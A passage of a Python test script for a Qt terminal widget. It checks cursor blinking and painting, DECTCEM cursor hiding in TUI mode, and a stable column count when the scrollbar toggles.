   and _cur._cursor_anchor().position() == _cur_out
   and _cur._cursor_anchor().position() != _cur.textCursor().position(),
   'the drawn cursor stays at the output position during a selection, not the selection end')
ok(_cur._blink_timer.isActive(),
   'the cursor keeps blinking during a selection (the reported bug)')
# blink toggles and painting is safe in every branch
_cur_on0 = _cur._cursor_on
_cur._blink_cursor()
ok(_cur._cursor_on != _cur_on0, 'the blink toggles the cursor phase')
_cur.viewport().repaint()                        # draw path (focused, on)
_cur._cursor_on = False
_cur.viewport().repaint()                        # focused OFF half-cycle -> no draw
_cur.clearFocus()
pump(20)
ok(not _cur._blink_timer.isActive(),
   'blinking stops when the widget loses focus (static cursor)')
_cur.viewport().repaint()                        # unfocused draw path
_cur._shot = True
_cur.viewport().repaint()                        # shot mode -> paintEvent draws nothing
_cur._shot = False
_cur.shutdown()

# preview surface and the _out_cursor fallback draw nothing / do not crash
_cur_pv = SecureTerminal(command=['/bin/sh'], tui=False, preview=True)
_cur_pv.resize(400, 200)
_cur_pv.show()
pump(50)
ok(_cur_pv._cursor_anchor() is not None, 'a fresh widget falls back to the text cursor anchor')
_cur_pv.viewport().repaint()                     # preview -> paintEvent draws nothing
_cur_pv.shutdown()

# DECTCEM: a TUI program hiding the cursor stops us drawing it
if tui_available():
    _cur_tui = SecureTerminal(command='/bin/cat', tui=True)
    _cur_tui.resize(500, 300)
    _cur_tui.show()
    _cur_tui.setFocus()
    feed_output(_cur_tui, b'hi')
    pump(120)
    ok(_cur_tui._cursor_visible, 'the TUI cursor is visible by default')
    feed_output(_cur_tui, b'\x1b[?25l')          # DECTCEM hide
    pump(120)
    ok(not _cur_tui._cursor_visible, 'a TUI program hiding the cursor (DECTCEM) stops drawing it')
    _cur_tui.viewport().repaint()                # not-visible -> paintEvent draws nothing
    feed_output(_cur_tui, b'\x1b[?25h')          # DECTCEM show
    pump(120)
    ok(_cur_tui._cursor_visible, 'the cursor returns when the program shows it again')
    _cur_tui.shutdown()


# --- winsize is stable whether the vertical scrollbar is shown ----------------
# _text_area reserves the scrollbar width UNCONDITIONALLY, so the column count does
# not change when an AsNeeded bar toggles. Otherwise the toggle SIGWINCHes the
# child, whose redraw toggles the bar back -- an endless flicker of a full-screen
# app (nano). Force the bar visible then hidden and assert the text width is
# unchanged (pre-fix it differed by a scrollbar width).
_fw = SecureTerminal(command='/bin/cat', tui=True)
_fw.resize(600, 300)
_fw.show()
pump(40)
_fw.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOn)
pump(30)
_w_on = _fw._text_area()[0]
_fw.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
pump(30)
_w_off = _fw._text_area()[0]
ok(_w_on == _w_off,
   'text width is the same whether the vertical scrollbar shows (no SIGWINCH flicker loop)')
_fw.shutdown()


finish('widget2')
